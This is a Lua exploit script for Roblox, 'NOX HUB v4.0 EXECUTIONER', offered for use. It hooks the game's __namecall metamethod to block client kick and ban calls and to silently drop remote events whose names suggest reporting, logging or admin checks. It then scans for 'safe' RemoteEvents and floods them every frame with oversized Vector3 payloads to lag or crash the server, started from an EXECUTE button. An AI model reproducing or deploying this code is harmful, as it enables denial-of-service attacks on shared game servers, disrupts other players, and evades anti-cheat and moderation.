--[[
    🔱 NOX HUB v4.0 [EXECUTIONER] 🔱
    "Precision is the difference between a butcher and a surgeon."
    
    EXECUTIONER FEATURES:
    - [WHITELIST TARGETING] : Only attacks known "Safe" high-load Remotes (Avatar/House).
    - [TRAP AVOIDANCE] : Ignores any Remote with "Admin", "Log", "System" in the name.
    - [PROTOCOL SHIELD] : Blocks the Client from sending "Ban Me" signals to the Server.
    - [REPLICATION LAG] : Uses legitimate-looking arguments to clog the Server buffer.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. PROTOCOL SHIELD (ANTI-HONEYPOT) //
-- Protects against Client-Sided Anti-Cheats reporting you.
local function ProtocolShield()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local name = self.Name:lower()
        
        -- 1. Disconnect Kick/Ban attempts from Client
        if method == "Kick" or method == "Ban" then return nil end
        
        -- 2. Block Reporting Remotes (The "Snitches")
        if method == "FireServer" and self:IsA("RemoteEvent") then
            if name:find("report") or name:find("log") or name:find("ban") or name:find("flag") or name:find("admin") or name:find("debug") then
                return nil -- Silent Block
            end
        end
        
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end
task.spawn(ProtocolShield)

-- // 2. EXECUTIONER ENGINE (TARGETED CRASH) //
local Engine = {
    Running = false,
    Targets = {}
}

-- SAFE SCANNER (WHITELIST ONLY)
function Engine:FindTargets()
    Engine.Targets = {}
    local SafeKeywords = {"Update", "Avatar", "Vehicle", "House", "Tool", "Equip", "Set"}
    
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and not v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            local isSafe = false
            
            -- Only allow if matches a Safe Keyword
            for _, k in pairs(SafeKeywords) do
                if n:find(k:lower()) then isSafe = true break end
            end
            
            -- DOUBLE CHECK: Ensure no Trap Keywords
            if n:find("admin") or n:find("check") or n:find("ban") then isSafe = false end
            
            if isSafe then
                table.insert(Engine.Targets, v)
            end
        end
    end
end

-- ATTACK LOOP
function Engine:Start()
    if Engine.Running then return end
    Engine:FindTargets()
    
    if #Engine.Targets == 0 then
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="EXECUTIONER", Text="NO VULNERABLE TARGETS FOUND."})
        return
    end
    
    Engine.Running = true
    
    -- Heavy Data Payload (Valid Types, Massive Size)
    local Payload = table.create(200, Vector3.new(9e9, 9e9, 9e9))
    
    task.spawn(function()
        while Engine.Running do
            for _, r in pairs(Engine.Targets) do
                if not Engine.Running then break end
                -- Mix of Valid Args to confuse parser
                pcall(function() r:FireServer(Payload) end)
                pcall(function() r:FireServer("🔱", Payload) end)
            end
            RunService.Heartbeat:Wait()
        end
    end)
end

function Engine:Stop()
    Engine.Running = false
end

-- // 3. EXECUTIONER UI //
local function CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxExec" then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxExec"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 400, 0, 200)
    Main.Position = UDim2.new(0.5, -200, 0.5, -100)
    Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(80, 80, 80)
    
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // EXECUTIONER v4.0"
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 14
    
    local Status = Instance.new("TextLabel", Main)
    Status.Text = "STATUS: IDLE"
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0, 35)
    Status.BackgroundTransparency = 1
    Status.TextColor3 = Color3.fromRGB(150, 150, 150)
    Status.Font = Enum.Font.Code
    Status.TextSize = 12
    
    local Toggle = Instance.new("TextButton", Main)
    Toggle.Size = UDim2.new(0.8, 0, 0.4, 0)
    Toggle.Position = UDim2.new(0.1, 0, 0.4, 0)
    Toggle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Toggle.Text = "EXECUTE"
    Toggle.TextColor3 = Color3.fromRGB(255, 50, 50)
    Toggle.Font = Enum.Font.GothamBlack
    Toggle.TextSize = 24
    
    Toggle.MouseButton1Click:Connect(function()
        if not Engine.Running then
            Engine:Start()
            Toggle.Text = "HALT"
            Toggle.TextColor3 = Color3.fromRGB(50, 255, 50)
            Status.Text = "STATUS: INJECTING [" .. #Engine.Targets .. " THREADS]"
            Status.TextColor3 = Color3.fromRGB(255, 50, 50)
        else
            Engine:Stop()
            Toggle.Text = "EXECUTE"
            Toggle.TextColor3 = Color3.fromRGB(255, 50, 50)
            Status.Text = "STATUS: IDLE"
            Status.TextColor3 = Color3.fromRGB(150, 150, 150)
        end
    end)
    
    -- DRAG
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

CreateUI()
